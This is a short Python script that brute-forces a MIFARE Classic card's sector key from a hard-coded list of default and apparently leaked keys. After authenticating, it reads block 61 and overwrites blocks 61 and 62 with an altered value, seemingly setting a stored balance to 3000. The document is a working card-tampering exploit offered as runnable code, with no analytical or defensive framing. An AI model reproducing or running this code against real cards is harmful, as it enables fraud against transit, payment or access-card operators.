from smartcard.scard import *
import smartcard.util

hresult, hcontext = SCardEstablishContext(SCARD_SCOPE_USER)

assert hresult==SCARD_S_SUCCESS

hresult, readers = SCardListReaders(hcontext, [])

assert len(readers)>0

reader = readers[0]

hresult, hcard, dwActiveProtocol = SCardConnect(
    hcontext,
    reader,
    SCARD_SHARE_SHARED,
    SCARD_PROTOCOL_T0 | SCARD_PROTOCOL_T1)


def load_key(key_A):
    key = smartcard.util.toBytes(key_A)
    APDU=[0xFF,0x82,0x00,0x00,0x06]
    APDU=APDU+key
    response = SCardTransmit(hcard,dwActiveProtocol,APDU)
    #print smartcard.util.toHexString(response[1])
    if response[1][0]==144:
        print "-- Load Key Success --"
    else:
        return 0

def authenticate_block(block):
    APDU=[0xFF,0x86,0x00,0x00,0x05,0x01,0x00,0x3E,0x60,0x00]
    APDU[-3]=block
    response = SCardTransmit(hcard,dwActiveProtocol,APDU)
    if response[1][0]==144:
        print "-- Authenticate Block Success --"
        return 1
    else:
        return 0


def read_data(block):
    APDU=[0xFF,0xB0,0x00,0x3E,0x0F]
    APDU[-2]=block
    response = SCardTransmit(hcard,dwActiveProtocol,APDU)
    Hex_Data=smartcard.util.toHexString(response[1])
    return Hex_Data[0:-3]



def write_data(block,data):
    APDU=[0xFF,0xD6,0x00]
    APDU.append(block)
    APDU.append(0x10)
    APDU=APDU+data
    response = SCardTransmit(hcard,dwActiveProtocol,APDU)
    #print response
    #print smartcard.util.toHexString(response[1])
    if response[1][0]==144:
        print "-- Write Block Success --"
    else:
        return 0


if __name__ == '__main__':
    keys=['FFFFFFFFFFFF','BD64FB026A10', '02199A0F9636', '9EA7BB0A8B10', 'F7449F0B2006', 'F5039ABB2236', '751E9BBBA236', 'ED66DE205A32', '701D8A645997', 'CB1AC556228B', '8D465A3CC69B', '0C4CFB1706EA', '01893BEFDD50', '8069FFFFFFFF', '', 'A0A1A2A3A4A5', 'D3F7D3F7D3F7', '000000000000', 'B0B1B2B3B4B5', '4D3A99C351DD', '1A982C7E459A', 'AABBCCDDEEFF', '714C5C886E97', '587EE5F9350F', 'A0478CC39091', '533CB6C723F6', '8FD0A4F256E9', 'A64598A77478', '26940B21FF5D', 'FC00018778F7', '00000FFE2488', '5C598C9C58B5', 'E4D2770A89BE', '434F4D4D4F41', '434F4D4D4F42', '47524F555041', '47524F555042', '505249564141', '505249564142', '0297927C0F77', 'EE0042F88840', '722BFCC5375F', 'F1D83F964314', '54726176656C', '776974687573', '4AF9D7ADEBE4', '2BA9621E0A36', '000000000001', '123456789ABC', 'B127C6F41436', '12F2EE3478C1', '34D1DF9934C5', '55F5A5DD38C9', 'F1A97341A9FC', '33F974B42769', '14D446E33363', 'C934FE34D934', '1999A3554A55', '27DD91F1FCF1', 'A94133013401', '99C636334433', '43AB19EF5C31', 'A053A292A4AF', '505249565441', '505249565442', 'FC0001877BF7', 'A0B0C0D0E0F0', 'A1B1C1D1E1F1', '9EA7BB0A8B18']

    for key in keys:
        try:
            load_key(key)
            if authenticate_block(61)==1:
                break
        except:
            pass

    pre_write=read_data(61)
    print "Old Data:"
    print "Block 61 & 62 :  %s" %(pre_write)

    pre_write=smartcard.util.toBytes(pre_write)

    pre_write[0]=184
    pre_write[1]=11

    write_data(61,pre_write)
    write_data(62,pre_write)

    print "New Data:"
    print "Block 61 & 62 :  %s" %(read_data(61))
